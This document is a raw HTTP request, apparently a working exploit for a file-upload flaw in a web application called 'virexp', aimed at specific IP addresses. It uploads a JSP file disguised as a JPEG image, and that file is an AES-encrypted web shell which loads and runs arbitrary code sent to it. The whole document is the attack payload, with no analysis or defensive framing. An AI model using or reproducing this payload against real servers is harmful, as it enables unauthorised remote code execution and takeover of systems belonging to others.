POST /virexp/lab/handle/!acceptImage HTTP/1.1 
Host: 223.3.95.188:8086 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Referer: http://202.115.80.207/virexp/lab/account/!getUserPaymentRecordPageIt?orderField=paymentRecord0.editTime&amp;isAsc=true 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjdu3v6fPfu0kTskW 
Content-Length: 751

------WebKitFormBoundaryjdu3v6fPfu0kTskW 
Content-Disposition: form-data; name="reportImage"; filename="7a7876640efec1fd07d9687d7524a66d.jsp" 
Content-Type: image/jpeg 

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> 
------WebKitFormBoundaryjdu3v6fPfu0kTskW---